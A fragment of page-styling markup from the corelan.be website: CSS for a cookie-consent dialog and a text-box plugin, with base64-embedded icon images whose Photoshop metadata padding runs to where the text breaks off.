span.gdpr-icon,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li.menu-item-selected button span.gdpr-icon{color:inherit}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li a span.gdpr-icon,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li button span.gdpr-icon{color:inherit}#moove_gdpr_cookie_modal .gdpr-acc-link{line-height:0;font-size:0;color:transparent;position:absolute}#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-close:hover i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li a,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li button,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li button i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-modal-left-content #moove-gdpr-menu li a i,#moove_gdpr_cookie_modal .moove-gdpr-modal-content .moove-gdpr-tab-main .moove-gdpr-tab-main-content a:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.mgbutton:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.mgbutton:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content span.change-settings-button:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.change-settings-button:hover,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content u.change-settings-button:hover,#moove_gdpr_cookie_info_bar span[data-href]>u.change-settings-button,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.mgbutton.focus-g,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.mgbutton.focus-g,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.focus-g,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.focus-g,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a.mgbutton:focus,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button.mgbutton:focus,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content a:focus,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content button:focus,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content span.change-settings-button.focus-g,span.change-settings-button:focus,button.change-settings-button.focus-g,button.change-settings-button:focus,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content u.change-settings-button.focus-g,#moove_gdpr_cookie_info_bar.moove-gdpr-dark-scheme .moove-gdpr-info-bar-container .moove-gdpr-info-bar-content u.change-settings-button:focus{color:#0c4da2}#moove_gdpr_cookie_modal.gdpr_lightbox-hide{display:none}
</style>
<link rel="stylesheet" id="stbCoreCSS-css" href="https://www.corelan.be/wp-content/plugins/wp-special-textboxes/css/stb-core.css?ver=6.2.2" type="text/css" media="all">
<style id="stbCoreCSS-inline-css" type="text/css">
.stb-container {border-radius: 5px;-webkit-box-shadow: 0px 0px 15px #555555;box-shadow: 0px 0px 15px #555555;margin: 10px 10px 10px 10px}.stb-container.stb-widget {margin-left: 0;margin-right: 0;box-shadow: none}.stb-container .stb-caption .stb-caption-content {font-size: 15px;font-family: Impact, Verdana, Helvetica, Arial, sans-serif}.stb-container .stb-caption .stb-tool {background-color: transparent;background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAKZJREFUeNrskr0NwjAQhZ9NaJmALbwIUwSJRdgAiTIVa2QBKNNQU1BSWPIPtnl2FERJ5DaWPp9cfE93OouUEmqOROVZAoDmIgQEcCZqjsjdXcm+MeNb7dpWaa3hnCt47wsxRuRVTzUjpcTQ92MHR14HYq2FMabUKSCE8JV+Eez6ReeUA+7A9gYMz66bNfuDTnY5OjY5iKzJ6k8/EE/eYvnK9QEfAQYA6/9arWk/ykwAAAAASUVORK5CYII=);background-position: 50%;background-repeat: no-repeat}.stb-container .stb-content {padding: 10px;font-size: unset;font-family: unset;text-shadow: unset}.stb-container.stb-collapsed .stb-caption .stb-tool {background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsTAAALEwEAmpwYAAA4GmlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4KPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS41LWMwMTQgNzkuMTUxNDgxLCAyMDEzLzAzLzEzLTEyOjA5OjE1ICAgICAgICAiPgogICA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPgogICAgICA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIgogICAgICAgICAgICB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIKICAgICAgICAgICAgeG1sbnM6cGhvdG9zaG9wPSJodHRwOi8vbnMuYWRvYmUuY29tL3Bob3Rvc2hvcC8xLjAvIgogICAgICAgICAgICB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIKICAgICAgICAgICAgeG1sbnM6c3RFdnQ9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZUV2ZW50IyIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iCiAgICAgICAgICAgIHhtbG5zOmV4aWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20vZXhpZi8xLjAvIj4KICAgICAgICAgPHhtcDpDcmVhdG9yVG9vbD5BZG9iZSBQaG90b3Nob3AgQ0MgKFdpbmRvd3MpPC94bXA6Q3JlYXRvclRvb2w+CiAgICAgICAgIDx4bXA6Q3JlYXRlRGF0ZT4yMDE0LTAxLTI4VDExOjI3OjE1KzAzOjAwPC94bXA6Q3JlYXRlRGF0ZT4KICAgICAgICAgPHhtcDpNb2RpZnlEYXRlPjIwMTQtMDItMDRUMTc6MzQ6MTErMDM6MDA8L3htcDpNb2RpZnlEYXRlPgogICAgICAgICA8eG1wOk1ldGFkYXRhRGF0ZT4yMDE0LTAyLTA0VDE3OjM0OjExKzAzOjAwPC94bXA6TWV0YWRhdGFEYXRlPgogICAgICAgICA8ZGM6Zm9ybWF0PmltYWdlL3BuZzwvZGM6Zm9ybWF0PgogICAgICAgICA8cGhvdG9zaG9wOkNvbG9yTW9kZT4zPC9waG90b3Nob3A6Q29sb3JNb2RlPgogICAgICAgICA8eG1wTU06SW5zdGFuY2VJRD54bXAuaWlkOjdjYTIzOWYyLTY1OWYtZjk0Ny04YmU0LTcyNWMxZTg3YjA1ZDwveG1wTU06SW5zdGFuY2VJRD4KICAgICAgICAgPHhtcE1NOkRvY3VtZW50SUQ+eG1wLmRpZDo3Y2EyMzlmMi02NTlmLWY5NDctOGJlNC03MjVjMWU4N2IwNWQ8L3htcE1NOkRvY3VtZW50SUQ+CiAgICAgICAgIDx4bXBNTTpPcmlnaW5hbERvY3VtZW50SUQ+eG1wLmRpZDo3Y2EyMzlmMi02NTlmLWY5NDctOGJlNC03MjVjMWU4N2IwNWQ8L3htcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD4KICAgICAgICAgPHhtcE1NOkhpc3Rvcnk+CiAgICAgICAgICAgIDxyZGY6U2VxPgogICAgICAgICAgICAgICA8cmRmOmxpIHJkZjpwYXJzZVR5cGU9IlJlc291cmNlIj4KICAgICAgICAgICAgICAgICAgPHN0RXZ0OmFjdGlvbj5jcmVhdGVkPC9zdEV2dDphY3Rpb24+CiAgICAgICAgICAgICAgICAgIDxzdEV2dDppbnN0YW5jZUlEPnhtcC5paWQ6N2NhMjM5ZjItNjU5Zi1mOTQ3LThiZTQtNzI1YzFlODdiMDVkPC9zdEV2dDppbnN0YW5jZUlEPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6d2hlbj4yMDE0LTAxLTI4VDExOjI3OjE1KzAzOjAwPC9zdEV2dDp3aGVuPgogICAgICAgICAgICAgICAgICA8c3RFdnQ6c29mdHdhcmVBZ2VudD5BZG9iZSBQaG90b3Nob3AgQ0MgKFdpbmRvd3MpPC9zdEV2dDpzb2Z0d2FyZUFnZW50PgogICAgICAgICAgICAgICA8L3JkZjpsaT4KICAgICAgICAgICAgPC9yZGY6U2VxPgogICAgICAgICA8L3htcE1NOkhpc3Rvcnk+CiAgICAgICAgIDx0aWZmOk9yaWVudGF0aW9uPjE8L3RpZmY6T3JpZW50YXRpb24+CiAgICAgICAgIDx0aWZmOlhSZXNvbHV0aW9uPjcyMDAwMC8xMDAwMDwvdGlmZjpYUmVzb2x1dGlvbj4KICAgICAgICAgPHRpZmY6WVJlc29sdXRpb24+NzIwMDAwLzEwMDAwPC90aWZmOllSZXNvbHV0aW9uPgogICAgICAgICA8dGlmZjpSZXNvbHV0aW9uVW5pdD4yPC90aWZmOlJlc29sdXRpb25Vbml0PgogICAgICAgICA8ZXhpZjpDb2xvclNwYWNlPjY1NTM1PC9leGlmOkNvbG9yU3BhY2U+CiAgICAgICAgIDxleGlmOlBpeGVsWERpbWVuc2lvbj4xNjwvZXhpZjpQaXhlbFhEaW1lbnNpb24+CiAgICAgICAgIDxleGlmOlBpeGVsWURpbWVuc2lvbj4xNjwvZXhpZjpQaXhlbFlEaW1lbnNpb24+CiAgICAgIDwvcmRmOkRlc2NyaXB0aW9uPgogICA8L3JkZjpSREY+CjwveDp4bXBtZXRhPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI